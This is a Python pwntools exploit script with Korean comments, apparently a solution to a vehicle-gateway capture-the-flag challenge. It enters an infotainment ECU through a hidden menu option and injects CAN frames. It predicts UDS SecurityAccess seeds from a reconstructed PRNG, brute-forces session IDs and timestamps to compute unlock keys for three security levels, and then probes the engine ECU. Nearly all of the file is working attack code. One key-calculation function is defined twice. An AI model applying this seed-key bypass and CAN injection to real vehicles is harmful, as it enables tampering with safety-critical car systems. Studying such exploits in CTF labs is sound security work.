#!/usr/bin/env python3

from pwn import *
import time
import struct
import hashlib
import re
import sys
from collections import defaultdict

context.log_level = 'info'

class GatewayExploit:
    def __init__(self, host='localhost', port=24963, session_id=None):
        self.host = host
        self.port = port
        self.session_id = session_id
        self.conn = None  # 명령어 실행용 연결
        self.dump_conn = None  # candump용 연결
        
        self.timing_data = defaultdict(list)
        self.seed_history = []
        self.prng_state = None
        self.prng_counter = 0
        
        if not session_id:
            log.error("Session ID is required!")
            sys.exit(1)
            
        log.info(f"Gateway exploit initialized - Session: {session_id}")
    
    def connect_to_ecu(self):
        """ECU에 연결하여 쉘 접근"""
        try:
            conn = remote(self.host, self.port)
            
            # Id 입력 대기
            conn.recvuntil(b'Id:')
            conn.sendline(b"a")
            
            # Password 입력 대기  
            conn.recvuntil(b'Password:')
            conn.sendline(b"a")
            
            # 메뉴 출력 대기
            conn.recvuntil(b'Choice: > ')
            
            # 4번 선택 (숨겨진 옵션)
            conn.sendline(b"4")
            
            # 쉘 접근 성공
            time.sleep(0.5)
            return conn
            
        except Exception as e:
            log.error(f"ECU connection failed: {e}")
            return None

    def connect(self):
        """인포테인먼트 ECU에 연결 (명령어용 + candump용)"""
        try:
            # 첫 번째 연결: 명령어 실행용
            log.info("Connecting to ECU for command execution...")
            self.conn = self.connect_to_ecu()
            if not self.conn:
                return False
            log.success("Command connection established")
            
            # 두 번째 연결: candump용
            log.info("Connecting to ECU for CAN monitoring...")
            self.dump_conn = self.connect_to_ecu()
            if not self.dump_conn:
                return False
            log.success("CAN dump connection established")
            
            # candump 시작
            log.info("Starting candump...")
            self.dump_conn.sendline(b"candump can0 &")
            time.sleep(1)
            
            log.success("Dual ECU connections ready!")
            return True
            
        except Exception as e:
            log.error(f"Connection setup failed: {e}")
            return False
    
    def execute_command(self, cmd, timeout=3):
        """명령어 실행 (프롬프트 없는 쉘)"""
        log.debug(f"Executing: {cmd}")
        self.conn.sendline(cmd.encode())
        
        try:
            # 명령어 실행 결과를 읽기 (프롬프트가 없으므로 timeout으로 처리)
            time.sleep(0.5)  # 명령어 실행 대기
            result = self.conn.recv(timeout=timeout)
            output = result.decode().strip()
            
            # 입력한 명령어 echo 제거
            lines = output.split('\n')
            if lines and lines[0].strip() == cmd.strip():
                output = '\n'.join(lines[1:]).strip()
            
            return output
        except:
            return ""
    
    def send_can_message(self, can_id, data_hex):
        """CAN 메시지 전송"""
        cmd = f"cansend can0 {can_id:03X}#{data_hex}"
        self.execute_command(cmd)
        log.debug(f"CAN TX: {can_id:03X}#{data_hex}")
    
    def read_can_response(self, timeout=3):
        """CAN 응답 읽기 (멀티프레임 지원)"""
        try:
            frames = []
            start_time = time.time()
            expecting_continuation = False
            
            while time.time() - start_time < timeout:
                try:
                    data = self.dump_conn.recv(timeout=0.5)
                    output = data.decode()
                    
                    lines = output.split('\n')
                    for line in lines:
                        if '7E8' in line and 'vcan0' in line:
                            log.debug(f"CAN RX: {line.strip()}")
                            
                            # CAN 데이터 파싱: (timestamp) vcan0 7E8#1067014EDE000000
                            hex_match = re.search(r'7E8#([0-9A-Fa-f]+)', line)
                            if hex_match:
                                hex_data = hex_match.group(1)
                                try:
                                    frame_data = bytes.fromhex(hex_data)
                                    
                                    # First Frame 감지 (0x10)
                                    if frame_data[0] == 0x10:
                                        log.debug(f"First frame detected: {frame_data.hex()}")
                                        frames = [frame_data]  # 새로운 멀티프레임 시작
                                        expecting_continuation = True
                                        continue
                                    
                                    # Continuation Frame (0x21)
                                    elif frame_data[0] == 0x21 and expecting_continuation:
                                        log.debug(f"Continuation frame detected: {frame_data.hex()}")
                                        frames.append(frame_data)
                                        
                                        # 2개 프레임이면 재조립 시도
                                        if len(frames) >= 2:
                                            reassembled = self.reassemble_multiframe(frames)
                                            if reassembled:
                                                log.debug(f"Reassembled data: {reassembled.hex()}")
                                                return reassembled
                                    
                                    # Single Frame (0x0X)
                                    elif frame_data[0] & 0xF0 == 0x00:
                                        log.debug(f"Single frame detected: {frame_data.hex()}")
                                        return frame_data
                                        
                                except ValueError as e:
                                    log.debug(f"Hex decode error: {e}")
                                    continue
                except Exception as e:
                    log.debug(f"Recv error: {e}")
                    continue
            
            log.debug("Timeout - no complete response received")
            return None
            
        except Exception as e:
            log.debug(f"CAN read error: {e}")
            return None
    
    def reassemble_multiframe(self, frames):
        """멀티프레임 재조립"""
        if len(frames) < 2:
            return None
            
        first_frame = frames[0]
        continuation_frame = frames[1]
        
        log.debug(f"Reassembling frames:")
        log.debug(f"  First: {first_frame.hex()}")
        log.debug(f"  Continuation: {continuation_frame.hex()}")
        
        # First Frame: 10 67 01 4EDE 0000 00
        # Continuation: 21 381A 0000 0000 0000
        
        # UDS 데이터 추출
        # First frame에서: SID(0x67) + Sub-function(0x01) + 시드 상위 2바이트
        # Continuation에서: 시드 하위 2바이트
        
        if first_frame[1] == 0x67:  # Positive response
            sub_function = first_frame[2]
            seed_high = struct.unpack('>H', first_frame[3:5])[0]  # 상위 2바이트
            seed_low = struct.unpack('>H', continuation_frame[1:3])[0]  # 하위 2바이트
            
            # 4바이트 시드 조합
            full_seed = (seed_high << 16) | seed_low
            
            log.debug(f"Seed parts: high=0x{seed_high:04X}, low=0x{seed_low:04X}")
            log.debug(f"Full seed: 0x{full_seed:08X}")
            
            # UDS 응답 재구성: [길이][SID][Sub][시드 4바이트]
            reassembled = struct.pack('>BBBL', 0x06, 0x67, sub_function, full_seed)
            return reassembled
        
        return None
    
    def send_uds_request(self, service_id, sub_function, data=b''):
        """UDS 요청 전송"""
        # PCI 계산: 데이터 길이 + SID + Sub-function
        pci = len(data) + 2
        uds_data = struct.pack('>BBB', pci, service_id, sub_function) + data
        
        # CAN 프레임은 8바이트로 패딩
        uds_hex = uds_data.hex().upper().ljust(16, '0')
        
        log.debug(f"UDS Request: PCI={pci:02X}, SID={service_id:02X}, Sub={sub_function:02X}, Data={data.hex()}")
        log.debug(f"Full CAN frame: {uds_hex}")
        
        start_time = time.perf_counter()
        self.send_can_message(0x7DF, uds_hex)
        response = self.read_can_response()
        end_time = time.perf_counter()
        
        response_time = end_time - start_time
        return response, response_time
    
    def init_prng(self):
        """PRNG 상태 초기화"""
        log.info("Initializing PRNG state...")
        
        md5_seed = int(hashlib.md5(self.session_id.encode()).hexdigest()[:8], 16)
        self.prng_state = md5_seed ^ 0x12345678
        self.prng_counter = 0
        
        log.success(f"Session ID: {self.session_id}")
        log.success(f"Session MD5: {hashlib.md5(self.session_id.encode()).hexdigest()}")
        log.success(f"MD5 seed: 0x{md5_seed:08X}")
        log.success(f"Initial PRNG state: 0x{self.prng_state:08X}")
        
        # 디버깅을 위해 첫 몇 개 PRNG 값 미리 계산해서 보여주기
        log.info("First few PRNG values:")
        temp_state = self.prng_state
        for i in range(1, 6):
            temp_state = ((temp_state * 1103515245 + 12345) & 0x7FFFFFFF)
            log.info(f"  PRNG[{i}]: 0x{temp_state:08X}")
    
    def bruteforce_session_id(self, received_seed, timestamp):
        """시드를 이용해 세션 ID 브루트포스"""
        log.info("Brute forcing session ID from seed...")
        
        time_factor = timestamp & 0xFF
        log.info(f"Using time factor: 0x{time_factor:02X}")
        
        # 일반적인 세션 ID 패턴들
        session_patterns = [
            'infotainment_001', 'infotainment_1', 'ecu_infotainment',
            'session_001', 'session_1', 'user_session', 
            'info_ecu', 'entertainment_sys', 'head_unit',
            'ivi_session', 'hmi_001', 'display_ecu',
            'test_session', 'debug_session', 'admin_session',
            'default', 'guest', 'anonymous', 'demo'
        ]
        
        # 현재 세션 ID도 포함
        if self.session_id not in session_patterns:
            session_patterns.insert(0, self.session_id)
        
        for candidate_id in session_patterns:
            log.info(f"Testing session ID: {candidate_id}")
            
            # PRNG 초기화
            md5_seed = int(hashlib.md5(candidate_id.encode()).hexdigest()[:8], 16)
            prng_state = md5_seed ^ 0x12345678
            
            # 첫 번째 PRNG 값
            prng_state = ((prng_state * 1103515245 + 12345) & 0x7FFFFFFF)
            
            # 시드 계산
            expected_seed = (prng_state ^ (time_factor << 16)) & 0xFFFFFFFF
            
            log.debug(f"  MD5: {hashlib.md5(candidate_id.encode()).hexdigest()[:8]}")
            log.debug(f"  PRNG: 0x{prng_state:08X}")
            log.debug(f"  Expected seed: 0x{expected_seed:08X}")
            
            if expected_seed == received_seed:
                log.success(f"✓ Found correct session ID: {candidate_id}")
                
                # 세션 ID 업데이트
                self.session_id = candidate_id
                self.prng_state = md5_seed ^ 0x12345678
                self.prng_counter = 0
                
                return True
        
        log.error("Could not find matching session ID")
        return False
    
    def next_prng(self):
        """다음 PRNG 값 생성"""
        self.prng_counter += 1
        self.prng_state = ((self.prng_state * 1103515245 + 12345) & 0x7FFFFFFF)
        log.debug(f"PRNG[{self.prng_counter}]: 0x{self.prng_state:08X}")
        return self.prng_state
    
    def request_seed(self, level):
        """시드 요청 (멀티프레임 응답 처리)"""
        log.info(f"Requesting seed for security level 0x{level:02X}")
        
        response, response_time = self.send_uds_request(0x27, level)
        
        if response and len(response) >= 7:
            # 재조립된 UDS 응답: [길이][SID][Sub][시드 4바이트]
            if response[1] == 0x67:  # Positive response
                seed = struct.unpack('>I', response[3:7])[0]
                timestamp = int(time.time())
                
                log.success(f"Seed: 0x{seed:08X} (time: {response_time:.4f}s)")
                
                self.seed_history.append({
                    'level': level,
                    'seed': seed,
                    'timestamp': timestamp,
                    'response_time': response_time
                })
                
                return seed, timestamp
        
        elif response and len(response) >= 4 and response[1] == 0x7F:
            error_code = response[3]
            error_names = {
                0x12: "Sub-function not supported",
                0x22: "Conditions not correct",
                0x31: "Request out of range", 
                0x33: "Security access denied",
                0x35: "Invalid key",
                0x36: "Exceeded number of attempts",
                0x37: "Required time delay not expired"
            }
            error_name = error_names.get(error_code, f"Unknown 0x{error_code:02X}")
            log.error(f"UDS Error: {error_name}")
        
        else:
            log.error(f"No valid response received (got {len(response) if response else 0} bytes)")
            if response:
                log.debug(f"Response data: {response.hex()}")
        
        return None, None
    
    def send_key(self, level, key):
        """키 전송 및 타이밍 분석"""
        log.info(f"Sending key for level 0x{level:02X}: 0x{key:08X}")
        
        # 키를 4바이트로 패킹
        key_data = struct.pack('>I', key)
        
        # PCI = 1 + 1 + 4 = 6 (SID + Sub + Key)
        # 전체 프레임: [06][27][02][AABBCCDD]
        log.debug(f"Key data: {key_data.hex()}")
        
        response, response_time = self.send_uds_request(0x27, level + 1, key_data)
        
        self.timing_data[level].append((key, response_time))
        
        if response and len(response) >= 3:
            if response[1] == 0x67:  # Positive response
                log.success(f"✓ Key accepted! Level 0x{level:02X} unlocked (time: {response_time:.4f}s)")
                return True
            elif response[1] == 0x7F:  # Negative response
                if len(response) >= 4:
                    error_code = response[3]
                    error_names = {
                        0x12: "Sub-function not supported",
                        0x13: "Incorrect message length",
                        0x22: "Conditions not correct",
                        0x31: "Request out of range",
                        0x33: "Security access denied", 
                        0x35: "Invalid key",
                        0x36: "Exceeded number of attempts",
                        0x37: "Required time delay not expired"
                    }
                    error_name = error_names.get(error_code, f"Unknown 0x{error_code:02X}")
                    log.warning(f"UDS Error: {error_name}")  # log.error를 log.warning으로 변경
                
        log.warning(f"✗ Key rejected (time: {response_time:.4f}s)")
        return False
    
    def calculate_level1_key(self, seed, timestamp):
        """Level 1 키 계산 - PRNG 역산으로 정확한 타임스탬프 찾기"""
        log.info("Calculating Level 1 key...")
        log.info("Reverse engineering seed generation using PRNG...")
        
        # 현재 PRNG 상태에서 다음 값 계산 (시드 생성시 사용된 값)
        predicted_prng = self.next_prng()
        log.info(f"Expected PRNG value: 0x{predicted_prng:08X}")
        log.info(f"Received seed: 0x{seed:08X}")
        
        # 시드 생성 공식: seed = (PRNG ^ (time_factor << 16)) & 0xFFFFFFFF
        # 역산: time_factor = (seed ^ PRNG) >> 16
        
        xor_result = seed ^ predicted_prng
        time_factor_from_seed = (xor_result >> 16) & 0xFFFF
        
        log.info(f"Seed XOR PRNG: 0x{xor_result:08X}")
        log.info(f"Time factor from seed XOR: 0x{time_factor_from_seed:04X}")
        
        # 타임스탬프 역산: timestamp & 0xFF = time_factor & 0xFF
        target_time_factor = time_factor_from_seed & 0xFF
        log.info(f"Target time factor (lower 8 bits): 0x{target_time_factor:02X}")
        
        # 현재 시간 기준으로 가능한 타임스탬프들 확인
        current_time = int(time.time())
        
        possible_timestamps = []
        for time_offset in range(0, 60):  # 60초 전까지
            test_timestamp = current_time - time_offset
            if (test_timestamp & 0xFF) == target_time_factor:
                possible_timestamps.append(test_timestamp)
                log.info(f"Matching timestamp: {test_timestamp} (offset={time_offset}s, factor=0x{test_timestamp & 0xFF:02X})")
        
        if not possible_timestamps:
            log.warning("No matching timestamp found!")
            log.info("Trying brute force approach...")
            
            # 브루트포스로 모든 가능한 time_factor 시도
            for tf in range(256):
                test_seed = (predicted_prng ^ (tf << 16)) & 0xFFFFFFFF
                if test_seed == seed:
                    log.success(f"Found time factor by brute force: 0x{tf:02X}")
                    target_time_factor = tf
                    # 이 time_factor와 일치하는 최근 타임스탬프 찾기
                    best_timestamp = current_time
                    while (best_timestamp & 0xFF) != target_time_factor:
                        best_timestamp -= 1
                        if current_time - best_timestamp > 3600:  # 1시간 이상 차이나면 중단
                            best_timestamp = current_time
                            break
                    possible_timestamps = [best_timestamp]
                    break
            else:
                log.error("Could not find matching PRNG pattern!")
                # 마지막 수단: 현재 시간 사용
                best_timestamp = current_time
                target_time_factor = best_timestamp & 0xFF
        else:
            # 가장 가능성 높은 타임스탬프 선택 (가장 최근 것)
            best_timestamp = possible_timestamps[0]
            target_time_factor = best_timestamp & 0xFF
        
        log.info(f"Selected timestamp: {best_timestamp}")
        log.info(f"Final time factor: 0x{target_time_factor:02X}")
        
        # 시드 생성 검증
        verification_seed = (predicted_prng ^ (target_time_factor << 16)) & 0xFFFFFFFF
        log.info(f"Verification seed: 0x{verification_seed:08X}")
        
        if verification_seed == seed:
            log.success("✓ Seed generation verified!")
        else:
            log.warning(f"✗ Seed verification failed!")
            log.warning(f"Expected: 0x{verification_seed:08X}, Got: 0x{seed:08X}")
            log.warning("Using received seed anyway...")
        
        # Level 1 키 계산: (seed ^ 0xA5A5A5A5) + (timestamp & 0xFF)
        key = ((seed ^ 0xA5A5A5A5) + target_time_factor) & 0xFFFFFFFF
        
        log.info(f"Level 1 key calculation:")
        log.info(f"  Seed: 0x{seed:08X}")
        log.info(f"  XOR constant: 0xA5A5A5A5")
        log.info(f"  After XOR: 0x{(seed ^ 0xA5A5A5A5):08X}")
        log.info(f"  Time factor: 0x{target_time_factor:02X}")
        log.info(f"  Final key: 0x{key:08X}")
        
        log.success(f"Level 1 key: 0x{key:08X}")
        return key
    
    def calculate_level3_key(self, seed, timestamp):
        """Level 3 키 계산 (PRNG 검증 없이)"""
        log.info("Calculating Level 3 key...")
        
        log.info(f"Level 3 key calculation:")
        log.info(f"  Seed: 0x{seed:08X}")
        log.info(f"  Timestamp: {timestamp}")
        
        # Level 3 키 계산
        step1 = seed ^ 0x5A5A5A5A
        step2 = ((step1 << 3) | (step1 >> 29)) & 0xFFFFFFFF
        step3 = step2 + ((timestamp & 0xFFFF) * 0x9E3779B9)
        key = step3 & 0xFFFFFFFF
        
        log.info(f"Key calculation steps:")
        log.info(f"  Step 1 (XOR): 0x{step1:08X}")
        log.info(f"  Step 2 (ROL3): 0x{step2:08X}")
        log.info(f"  Step 3 (final): 0x{key:08X}")
        
        log.success(f"Level 3 key: 0x{key:08X}")
        return key
    
    def calculate_level3_key(self, seed, timestamp):
        """Level 3 키 계산"""
        log.info("Calculating Level 3 key...")
        
        predicted_prng = self.next_prng()
        
        # Level 3 시드 생성 분석
        session_time = int(timestamp - self.seed_history[0]['timestamp'])
        time_factor = (timestamp ^ session_time) & 0xFFFF
        expected_seed = (predicted_prng ^ (time_factor << 8) ^ 0xCAFEBABE) & 0xFFFFFFFF
        
        log.info(f"Level 3 seed analysis:")
        log.info(f"  Received: 0x{seed:08X}")
        log.info(f"  PRNG[{self.prng_counter}]: 0x{predicted_prng:08X}")
        log.info(f"  Session time: {session_time}s")
        log.info(f"  Time factor: 0x{time_factor:04X}")
        log.info(f"  Expected: 0x{expected_seed:08X}")
        
        if expected_seed != seed:
            log.error("✗ Level 3 seed prediction failed!")
            return None
        
        log.success("✓ Level 3 seed prediction confirmed!")
        
        # Level 3 키 계산
        step1 = seed ^ 0x5A5A5A5A
        step2 = ((step1 << 3) | (step1 >> 29)) & 0xFFFFFFFF
        step3 = step2 + ((timestamp & 0xFFFF) * 0x9E3779B9)
        key = step3 & 0xFFFFFFFF
        
        log.info(f"Key calculation steps:")
        log.info(f"  Step 1 (XOR): 0x{step1:08X}")
        log.info(f"  Step 2 (ROL3): 0x{step2:08X}")
        log.info(f"  Step 3 (final): 0x{key:08X}")
        
        log.success(f"Level 3 key: 0x{key:08X}")
        return key
    
    def calculate_level5_key(self, seed, timestamp):
        """Level 5 키 계산 (MD5 기반)"""
        log.info("Calculating Level 5 key...")
        
        # MD5 기반 키 계산
        data = struct.pack('>II', seed, timestamp)
        hash_input = data + self.session_id.encode()
        hash_obj = hashlib.md5(hash_input)
        hash_bytes = hash_obj.digest()[:4]
        base_key = struct.unpack('>I', hash_bytes)[0]
        
        # 복잡한 변환 과정
        transform1 = ((base_key ^ 0x12345678) * 0x41C64E6D) & 0xFFFFFFFF
        transform2 = ((transform1 + 0x3039) >> 1) & 0xFFFFFFFF
        
        log.info(f"Level 5 key calculation:")
        log.info(f"  MD5 input: {hash_input.hex()}")
        log.info(f"  MD5 hash: {hash_obj.hexdigest()}")
        log.info(f"  Base key: 0x{base_key:08X}")
        log.info(f"  Transform1: 0x{transform1:08X}")
        log.info(f"  Transform2: 0x{transform2:08X}")
        
        log.success(f"Level 5 key: 0x{transform2:08X}")
        return transform2
    
    def attack_level(self, level):
        """특정 레벨 공격 (타임스탬프 역산 적용)"""
        log.info(f"{'='*20} ATTACKING LEVEL 0x{level:02X} {'='*20}")
        
        if level == 0x01:
            # Level 1 전용 로직: 빠른 타임스탬프 역산
            log.info("Level 1: Fast timestamp reverse engineering...")
            
            max_attempts = 3  # 최대 3번의 시드 요청
            
            for attempt in range(max_attempts):
                log.info(f"Attempt {attempt + 1}/{max_attempts}")
                
                # 시드 요청
                seed, current_timestamp = self.request_seed(level)
                if seed is None:
                    continue
                
                log.info(f"Seed: 0x{seed:08X}, Current time: {current_timestamp}")
                
                # 빠른 시도: 가능성 높은 오프셋부터 (0~10초 전)
                likely_offsets = [3, 4, 5, 2, 6, 1, 7, 0, 8, 9, 10]  # 3-4초가 가장 가능성 높음
                
                for offset in likely_offsets:
                    test_timestamp = current_timestamp - offset
                    time_factor = test_timestamp & 0xFF
                    
                    # Level 1 키 계산: (seed ^ 0xA5A5A5A5) + time_factor
                    key = ((seed ^ 0xA5A5A5A5) + time_factor) & 0xFFFFFFFF
                    
                    log.info(f"  Testing offset {offset}s: factor=0x{time_factor:02X}, key=0x{key:08X}")
                    
                    if self.send_key(level, key):
                        log.success(f"SUCCESS! Offset: {offset}s, Timestamp: {test_timestamp}")
                        return True
                    
                    # 빠른 시도를 위해 대기 시간 단축
                    time.sleep(0.1)
                
                log.warning(f"Attempt {attempt + 1} failed, requesting new seed...")
                time.sleep(1)  # 잠깐 대기 후 새 시드 요청
            
            log.error("All attempts failed for Level 1")
            return False
            
        # 다른 레벨들
        elif level == 0x03:
            seed, timestamp = self.request_seed(level)
            if seed is None:
                return False
            key = self.calculate_level3_key(seed, timestamp)
            
        elif level == 0x05:
            seed, timestamp = self.request_seed(level)
            if seed is None:
                return False
            key = self.calculate_level5_key(seed, timestamp)
            
        else:
            log.error(f"Unknown level: 0x{level:02X}")
            return False
        
        if key is None:
            return False
        
        return self.send_key(level, key)
    
    def test_engine_access(self):
        """엔진 ECU 접근 테스트"""
        log.info("Testing engine ECU access...")
        
        # 엔진 ECU 접근 시도 (CAN ID 0x456)
        engine_data = struct.pack('>BBH', 0x03, 0x22, 0xF190)
        engine_hex = engine_data.hex().upper().ljust(16, '0')
        
        start_time = time.perf_counter()
        self.send_can_message(0x456, engine_hex)
        
        # 엔진 응답 확인 (candump 연결에서)
        engine_response_ids = [0x458, 0x45A, 0x45C, 0x460]
        timeout = 5
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            try:
                data = self.dump_conn.recv(timeout=1)
                output = data.decode()
                
                for response_id in engine_response_ids:
                    if f"{response_id:03X}" in output:
                        log.success(f"Engine ECU response received from ID 0x{response_id:03X}!")
                        log.success(f"Response: {output.strip()}")
                        
                        # 플래그 추출 시도
                        hex_match = re.search(r'[0-9A-Fa-f\s]{16,}', output)
                        if hex_match:
                            try:
                                hex_data = hex_match.group().replace(' ', '')
                                response_bytes = bytes.fromhex(hex_data)
                                
                                # ASCII 변환 시도
                                flag_text = response_bytes.decode('ascii', errors='ignore')
                                if 'FLAG{' in flag_text or 'CTF{' in flag_text or 'flag{' in flag_text:
                                    log.success(f"🚩 FLAG FOUND: {flag_text}")
                                else:
                                    log.info(f"Response data: {flag_text}")
                            except:
                                pass
                        
                        return True
                        
            except:
                continue
        
        log.error("No engine ECU response - access denied")
        return False
    
    def timing_analysis(self):
        """타이밍 공격 분석"""
        log.info("Performing timing analysis...")
        
        for level, timing_list in self.timing_data.items():
            if timing_list:
                log.info(f"Level 0x{level:02X} timing data:")
                
                for key, timing in timing_list:
                    log.info(f"  Key 0x{key:08X}: {timing:.4f}s")
                
                avg_time = sum(t[1] for t in timing_list) / len(timing_list)
                fast_responses = [t for t in timing_list if t[1] < avg_time - 0.01]
                slow_responses = [t for t in timing_list if t[1] > avg_time + 0.01]
                
                log.info(f"  Average time: {avg_time:.4f}s")
                if fast_responses:
                    log.warning(f"  Fast responses (potential correct keys): {len(fast_responses)}")
                    for key, timing in fast_responses:
                        log.warning(f"    Key 0x{key:08X}: {timing:.4f}s")
                
                if slow_responses:
                    log.info(f"  Slow responses: {len(slow_responses)}")
    
    def show_summary(self):
        """공격 결과 요약"""
        log.info("="*60)
        log.info("ATTACK SUMMARY")
        log.info("="*60)
        
        log.info(f"Session ID: {self.session_id}")
        log.info(f"Total seeds requested: {len(self.seed_history)}")
        
        for entry in self.seed_history:
            log.info(f"  Level 0x{entry['level']:02X}: Seed 0x{entry['seed']:08X} at {entry['timestamp']}")
        
        if self.timing_data:
            log.info("Timing attack data collected:")
            for level, data in self.timing_data.items():
                log.info(f"  Level 0x{level:02X}: {len(data)} attempts")
    
    def run_full_exploit(self):
        """전체 공격 실행"""
        log.info("🚗 Starting Gateway Authentication Exploit 🚗")
        log.info(f"Target: {self.host}:{self.port}")
        log.info(f"Session: {self.session_id}")
        
        if not self.connect():
            return False
        
        try:
            # PRNG 초기화
            self.init_prng()
            
            # CAN 인터페이스 확인
            can_check = self.execute_command("ip link show can0")
            if "can0" in can_check:
                log.success("CAN interface found")
            else:
                log.warning("CAN interface not found, but continuing...")
            
            # Level 1 공격
            if self.attack_level(0x01):
                log.success("🔓 Level 1 authentication bypassed!")
                time.sleep(1)
                
                # Level 3 공격  
                if self.attack_level(0x03):
                    log.success("🔓 Level 3 authentication bypassed!")
                    time.sleep(1)
                    
                    # Level 5 공격
                    if self.attack_level(0x05):
                        log.success("🔓 Level 5 authentication bypassed!")
                        log.success("🎉 ALL SECURITY LEVELS CRACKED! 🎉")
                        
                        time.sleep(1)
                        # 엔진 ECU 접근
                        if self.test_engine_access():
                            log.success("🏁 ENGINE ECU COMPROMISED! 🏁")
                            log.success("🏆 CHALLENGE COMPLETED! 🏆")
                            
                            self.show_summary()
                            return True
            
            # 실패한 경우 타이밍 분석
            self.timing_analysis()
            self.show_summary()
            log.warning("❌ Exploit failed - not all levels unlocked")  # log.error를 log.warning으로 변경
            return False
            
        except KeyboardInterrupt:
            log.warning("Exploit interrupted by user")
            return False
        except Exception as e:
            log.warning(f"Exploit failed with error: {e}")  # log.error를 log.warning으로 변경
            import traceback
            traceback.print_exc()
            return False
        finally:
            # 연결 정리
            if self.conn:
                self.conn.close()
            if self.dump_conn:
                self.dump_conn.close()

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Gateway Authentication Exploit')
    parser.add_argument('--host', default='localhost', help='Target host')
    parser.add_argument('--port', type=int, default=27708, help='Target port (from API response)')
    parser.add_argument('--session', default='session_1750043538_9512', help='Session ID (from API response)')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    
    args = parser.parse_args()
    
    if args.debug:
        context.log_level = 'debug'
    
    log.info(f"Using session ID from CTF API: {args.session}")
    log.info(f"Connecting to infotainment ECU: {args.host}:{args.port}")
    
    exploit = GatewayExploit(args.host, args.port, args.session)
    
    if exploit.run_full_exploit():
        log.success("\n" + "="*60)
        log.success("🔥 GATEWAY COMPLETELY COMPROMISED! 🔥")
        log.success("🚗 VEHICLE SECURITY BYPASSED! 🚗")
        log.success("🏆 CTF CHALLENGE SOLVED! 🏆")
        log.success("="*60)
        sys.exit(0)
    else:
        log.error("\n" + "="*60)
        log.error("❌ EXPLOIT FAILED")
        log.error("Check session ID or try manual analysis")
        log.error("="*60)
        sys.exit(1)

if __name__ == "__main__":
    main()